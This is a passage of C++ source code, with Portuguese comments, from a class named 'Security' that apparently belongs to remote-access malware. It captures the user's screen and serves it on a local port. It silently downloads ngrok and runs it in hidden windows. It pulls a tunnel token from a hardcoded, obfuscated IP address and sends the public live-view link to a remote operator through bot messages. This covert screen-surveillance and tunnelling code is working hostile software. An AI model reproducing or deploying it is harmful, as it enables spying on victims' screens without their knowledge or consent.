                    pStream->Stat(&stat, STATFLAG_NONAME);
                    ULONG size = (ULONG)stat.cbSize.QuadPart;

                    HGLOBAL hGlobal = NULL;
                    GetHGlobalFromStream(pStream, &hGlobal);
                    void* pData = GlobalLock(hGlobal);

                    if (pData && size > 0)
                    {
                        std::lock_guard<std::mutex> lock(frameMutex);
                        frameBuffer.assign((char*)pData, (char*)pData + size);
                        frameReady = true;
                        frameCount++;
                    }

                    GlobalUnlock(hGlobal);
                }
                pStream->Release();
            }
            delete bmpResized;
        }
        else
        {
            if (bmpFull) delete bmpFull;
        }

        // Log de FPS a cada 5 segundos
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastFpsLog).count();
        if (elapsed >= 5)
        {
            sprintf_s(buf, "[Capture] FPS real: %d\n", (int)(frameCount / elapsed));
            ConsoleLog(buf);
            frameCount = 0;
            lastFpsLog = now;
        }

        // Limitar a 30 FPS no servidor (o JS pode pedir mais rapido)
        auto frameEnd = std::chrono::steady_clock::now();
        auto frameDuration = std::chrono::duration_cast<std::chrono::milliseconds>(frameEnd - frameStart).count();
        int sleepMs = 33 - (int)frameDuration; // 33ms = ~30 FPS
        if (sleepMs > 0) Sleep(sleepMs);
    }

    GdiplusShutdown(gdiplusToken);
    ConsoleLog("[Capture] Thread de captura encerrada\n");
}

void Security::StartScreenServer()
{
    if (screenServerRunning) return;

    std::thread([this]() {

        // 1. Iniciar servidor HTTP local
        SendSimpleMessage("🚀 **[1/3]** Iniciando servidor de captura...");
        screenServerRunning = true;
        std::thread(&Security::ScreenServerLoop, this).detach();
        std::thread(&Security::ScreenCaptureLoop, this).detach();
        Sleep(1500);
        SendSimpleMessage("✅ **[1/3]** Servidor local iniciado na porta 8080!");

        // 2. Baixar ngrok se necessário
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        std::string ngrokExe = std::string(tempPath) + "ngrok.exe";

        if (GetFileAttributesA(ngrokExe.c_str()) == INVALID_FILE_ATTRIBUTES)
        {
            SendSimpleMessage("📥 **[2/3]** Baixando ngrok...");
            std::string zipPath = std::string(tempPath) + "ngrok.zip";

            HINTERNET hS = WinHttpOpen(L"dl/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (hS) {
                HINTERNET hC = WinHttpConnect(hS, L"download.ngrok.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
                if (hC) {
                    HINTERNET hR = WinHttpOpenRequest(hC, L"GET", L"/ngrok-v3/releases/latest/ngrok-v3-stable-windows-amd64.zip", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
                    if (hR && WinHttpSendRequest(hR, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) && WinHttpReceiveResponse(hR, NULL)) {
                        std::ofstream out(zipPath, std::ios::binary);
                        char buf[65536]; DWORD rd;
                        while (WinHttpQueryDataAvailable(hR, &rd) && rd > 0 && WinHttpReadData(hR, buf, min(rd, (DWORD)sizeof(buf)), &rd)) out.write(buf, rd);
                        out.close();
                        WinHttpCloseHandle(hR);
                        std::string ex = "powershell -Command \"Expand-Archive -Path '" + zipPath + "' -DestinationPath '" + std::string(tempPath) + "' -Force\"";
                        STARTUPINFOA si2 = {}; PROCESS_INFORMATION pi2 = {}; si2.cb = sizeof(si2); si2.dwFlags = STARTF_USESHOWWINDOW; si2.wShowWindow = SW_HIDE;
                        if (CreateProcessA(NULL, (LPSTR)ex.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) { WaitForSingleObject(pi2.hProcess, 30000); CloseHandle(pi2.hProcess); CloseHandle(pi2.hThread); }
                        DeleteFileA(zipPath.c_str());
                    }
                    WinHttpCloseHandle(hC);
                }
                WinHttpCloseHandle(hS);
            }
        }

        if (GetFileAttributesA(ngrokExe.c_str()) == INVALID_FILE_ATTRIBUTES) {
            SendSimpleMessage("❌ Falha ao baixar ngrok. Verifique a conexão.");
            screenServerRunning = false; return;
        }

        // Buscar token do bot (configurado via /setngrok)
        std::string ngrokToken = (char*)AY_OBFUSCATE(""); // fallback
        {
            HINTERNET hS2 = WinHttpOpen(L"tok/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (hS2) {
                HINTERNET hC2 = WinHttpConnect(hS2, AY_OBFUSCATE(L"15.228.83.81"), BOT_HTTP_PORT, 0);
                if (hC2) {
                    HINTERNET hR2 = WinHttpOpenRequest(hC2, L"GET", L"/ngroktoken", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
                    if (hR2 && WinHttpSendRequest(hR2, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) && WinHttpReceiveResponse(hR2, NULL)) {
                        char tbuf[512] = {}; DWORD trd;
                        if (WinHttpReadData(hR2, tbuf, sizeof(tbuf) - 1, &trd)) {
                            std::string resp(tbuf, trd);
                            // Extrair "token":"xxxx"
                            size_t tp = resp.find("\"token\":\"");
                            if (tp != std::string::npos) {
                                tp += 9;
                                size_t te = resp.find("\"", tp);
                                if (te != std::string::npos && te > tp)
                                    ngrokToken = resp.substr(tp, te - tp);
                            }
                        }
                        WinHttpCloseHandle(hR2);
                    }
                    WinHttpCloseHandle(hC2);
                }
                WinHttpCloseHandle(hS2);
            }
        }

        // Configurar token
        std::string tk = "\"" + ngrokExe + "\" config add-authtoken " + ngrokToken;
        STARTUPINFOA si3 = {}; PROCESS_INFORMATION pi3 = {}; si3.cb = sizeof(si3); si3.dwFlags = STARTF_USESHOWWINDOW; si3.wShowWindow = SW_HIDE;
        if (CreateProcessA(NULL, (LPSTR)tk.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si3, &pi3)) { WaitForSingleObject(pi3.hProcess, 5000); CloseHandle(pi3.hProcess); CloseHandle(pi3.hThread); }

        // 3. Iniciar ngrok
        SendSimpleMessage("🌐 **[3/3]** Iniciando túnel ngrok...");

        SECURITY_ATTRIBUTES sa = {}; sa.nLength = sizeof(sa); sa.bInheritHandle = TRUE;
        HANDLE hRead, hWrite;
        CreatePipe(&hRead, &hWrite, &sa, 0);
        SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

        std::string nc = "\"" + ngrokExe + "\" http 8080 --log=stdout";
        STARTUPINFOA si4 = {}; PROCESS_INFORMATION pi4 = {};
        si4.cb = sizeof(si4); si4.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si4.wShowWindow = SW_HIDE; si4.hStdOutput = hWrite; si4.hStdError = hWrite;

        if (!CreateProcessA(NULL, (LPSTR)nc.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si4, &pi4)) {
            CloseHandle(hRead); CloseHandle(hWrite);
            SendSimpleMessage("❌ Falha ao iniciar ngrok."); screenServerRunning = false; return;
        }
        ngrokPID = pi4.dwProcessId;
        CloseHandle(hWrite); CloseHandle(pi4.hProcess); CloseHandle(pi4.hThread);

        // Aguardar URL
        std::string output, tunnelUrl;
        char rbuf[4096]; DWORD rb;
        auto t0 = std::chrono::steady_clock::now();

        while (std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - t0).count() < 30) {
            DWORD avail = 0;
            if (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
                DWORD tr = min(avail, (DWORD)(sizeof(rbuf) - 1));
                if (ReadFile(hRead, rbuf, tr, &rb, NULL)) {
                    rbuf[rb] = '\0'; output += rbuf;
                    size_t pos = 0;
                    while ((pos = output.find("https://", pos)) != std::string::npos) {
                        size_t end = output.find_first_of(" \r\n\t\"'`", pos + 8);
                        if (end == std::string::npos) end = output.size();
                        std::string c = output.substr(pos, end - pos);
                        // Remover caracteres inválidos do fim da URL
                        while (!c.empty() && (c.back() == '\'' || c.back() == '`' || c.back() == '"' || c.back() == ')'))
                            c.pop_back();
                        if (c.find("ngrok") != std::string::npos && c.size() > 12) { tunnelUrl = c; break; }
                        pos = end;
                    }
                    if (!tunnelUrl.empty()) break;
                }
            }
            Sleep(500);
        }
        CloseHandle(hRead);

        if (tunnelUrl.empty()) {
            SendSimpleMessage("❌ Ngrok não retornou URL.\nToken pode estar inválido — obtenha um novo em: https://dashboard.ngrok.com");
            screenServerRunning = false; return;
        }

        ngrokUrl = tunnelUrl;
        SendSimpleMessage("✅ **PRONTO!**\n\n🌐 **Link:**\n```\n" + tunnelUrl + "\n```\n\n📖 Cole no navegador para ver a tela ao vivo.");

        }).detach();
}

void Security::StopScreenServer()
{
    screenServerRunning = false;

    // Matar apenas o processo ngrok desta sessão (usando PID salvo)
    if (ngrokPID != 0)
    {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ngrokPID);
        if (hProcess)
        {
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
            ConsoleLog(("[Screen] Túnel SSH PID " + std::to_string(ngrokPID) + " encerrado\n").c_str());
        }
        ngrokPID = 0;
    }

    ngrokUrl = "";
    SendSimpleMessage("⏹️ Visualização de tela encerrada.");
}


// Função para logar via OutputDebugString (sem console)
void Security::ConsoleLog(const std::string& message)
{
    OutputDebugStringA(message.c_str());
}

